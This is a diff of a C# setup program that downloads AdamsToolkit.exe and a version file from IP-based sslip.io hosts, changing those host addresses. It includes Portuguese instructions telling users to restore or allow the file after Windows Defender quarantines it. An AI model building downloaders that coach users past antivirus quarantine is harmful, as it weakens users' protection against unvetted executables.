@@ -21,8 +21,8 @@ namespace AdamsSetup;
 internal static class Program
 {
     private const string RuntimeUrl = "https://aka.ms/dotnet/8.0/windowsdesktop-runtime-win-x64.exe";
-    private const string AppUrl = "https://adams-62-238-22-77.sslip.io/files/AdamsToolkit.exe";
-    private const string VersionUrl = "https://adams-62-238-22-77.sslip.io/files/version.json";
+    private const string AppUrl = "https://adams-176-111-109-91.sslip.io/files/AdamsToolkit.exe";
+    private const string VersionUrl = "https://adams-176-111-109-91.sslip.io/files/version.json";
 
     // ---- MessageBox nativo (não precisa de UI framework) ----
     [DllImport("user32.dll", CharSet = CharSet.Unicode)]
@@ -104,7 +104,7 @@ internal static class Program
             "  3. Procura a entrada «Adams Toolkit» / «AdamsToolkit.exe»\n" +
             "  4. Acoes \u2192 «Permitir no dispositivo» (ou «Restaurar»)\n" +
             "  5. Volta a abrir o Adams Toolkit\n\n" +
-            "Guia passo a passo: https://adams-62-238-22-77.sslip.io/files/defender.html\n" +
+            "Guia passo a passo: https://adams-176-111-109-91.sslip.io/files/defender.html\n" +
             "Se preferires nao mexer nisto, fala com a staff da WestRP.\n\n" +
             "Queres abrir agora o Historico de protecao?",
             "Adams Toolkit", MB_YESNO | MB_ICONQ);
